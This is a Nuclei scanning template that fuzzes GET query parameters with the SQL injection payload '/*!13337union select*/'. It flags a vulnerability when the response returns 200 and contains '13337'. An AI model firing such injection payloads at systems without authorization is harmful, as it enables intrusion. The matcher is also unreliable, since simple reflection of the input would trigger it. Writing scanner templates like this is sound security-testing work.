id: fuzz-sqli-custom

info:
  name: Custom SQL Injection Detection
  author: netbaan
  severity: high
  description: |
    This template is designed to detect SQL Injection vulnerabilities using a specific payload.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Run only on GET requests

    payloads:
      sqli:
        - "/*!13337union select*/"

    stop-at-first-match: true

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{sqli}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "13337"  # Expected output related to the payload

      - type: status
        status:
          - 200  # Expect a 200 OK response, ideally indicating successful execution of the injection